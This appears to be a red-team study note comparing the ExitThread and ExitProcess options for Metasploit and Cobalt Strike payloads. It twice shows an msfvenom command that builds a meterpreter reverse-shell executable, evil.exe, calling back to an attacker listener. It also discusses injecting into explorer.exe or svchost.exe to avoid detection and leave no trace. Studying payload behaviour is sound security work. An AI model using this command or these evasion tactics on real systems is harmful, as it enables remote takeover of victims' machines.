# ExitProcess vs ExitThread

## Recap

### process

is an instance of a program that is currently running. It contains the program's code, data, resources (such as file handles, memory, etc.), and at least one thread. A process is the basic unit for resource allocation in an operating system. Each process has its own independent memory space, and processes are typically isolated from one another.

### Thread

A thread is an execution unit within a process. A process can contain multiple threads, and threads share the resources of the process (such as memory and file handles), but each thread has its own stack and registers. A thread is the basic unit of CPU scheduling.

<figure><img src="../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

### # Setting EXITFUNC&#x20;

In cobalt strike in the generating of payload we are able to set the Exit functions

<figure><img src="../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

In msfvenom, we can set through the commands

{% code overflow="wrap" %}
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 EXITFUNC=process -f exe -o evil.exe
```
{% endcode %}

### EXITFUNC: Thread

**Behavior**

* When EXITFUNC is set to thread, the payload calls the ExitThread function.
* This terminates the current thread but does not affect other threads within the same process.

**Impact**

* The process itself does not exit, and other threads (if any) continue running.
* If the payload is injected into a legitimate process (e.g., explorer.exe or iexplore.exe) as a sub-thread, terminating that thread typically does not cause the entire process to crash.

**Applicable Scenarios**

* Suitable for most exploitation scenarios, especially when the payload runs in a sub-thread of the target process.
* Ideal for scenarios where the target process **needs to remain alive** (e.g., to maintain stealth or for subsequent operations).

**Potential Issues**

* If the payload runs in the main thread, calling ExitThread may cause the entire process to exit (depending on the Windows version and specific behavior).
* If the thread's execution path is not clean, it may leave behind residual resources.

***

### EXITFUNC: Process

**Behavior**

* When EXITFUNC is set to process, the payload calls the ExitProcess function.
* This terminates the entire process, including all threads within it.

**Impact**

* All resources occupied by the process (e.g., memory, file handles) are reclaimed by the operating system.
* If the payload is injected into an existing process, calling ExitProcess will cause the **entire target process to exit.**

**Applicable Scenarios**

* Suitable for scenarios involving multi/handler (a listener in Metasploit used to handle multi-session payloads).
* Ideal for payloads running in an **independent process**, where a **complete cleanup** is needed after the task is finished.

**Potential Issues**

* If the payload is injected into a critical process (e.g., svchost.exe), calling ExitProcess will cause that process to crash, potentially leading to system instability or user detection.
* Not suitable for scenarios where the target process **needs to remain alive.**

## Why EXITFUNC=process is recommended&#x20;

{% code overflow="wrap" %}
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 EXITFUNC=process -f exe -o evil.exe
```
{% endcode %}

In this example, we are generating an executable file and is going to launch on victim computer and create a meterpreter.&#x20;

After the second stage payload is sent to victim, the connection is established. The meterpreter module will be injected into other process such as explorer.exe or svchosts.exe. The original evil.exe will no longer be used, and it is good that the process is being "Cleaned" to prevent any trace or zombie process.

Some misunderstanding about the payload execution\
1\) Payload and meterpreter is the samething

* Actually fact, payload such as evil.exe is just a launcher, the main task is to load meterpreter shellcode into memory, once it's been loaded, evil.exe can be exit they are no dependent.

2\) Connection needs the original process

* Meterpreter connection does not need the original process to be alived.
* Meterpreter have its own TCP connection with multi/handler, even the payload quits, meterpreter will still continue to run as they inject themself to a legitamte process



## Author

Ik0nw
